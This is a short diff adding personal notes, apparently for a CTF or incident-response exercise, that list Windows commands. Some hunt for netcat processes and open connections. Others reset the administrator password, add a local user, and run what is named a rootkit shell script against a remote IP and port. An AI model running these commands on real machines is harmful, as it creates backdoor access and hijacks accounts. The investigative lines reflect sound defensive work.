@@ -1,0 +1,6 @@
+- https://www.youtube.com/watch?v=y9KI-rWGOUA
+- `get-wmiobject win32_process | ?{$_.name -eq "nc.exe"} | select name, commandline`
+- `get-nettcpconnection` (`netstat -ano | findstr "PID :PortNumber"`)
+- `commander --iex <ip> <port> rootkitshell.ps1` ? 
+- `net user administrator Password1234`
+- `net user DefaultAccount /add`
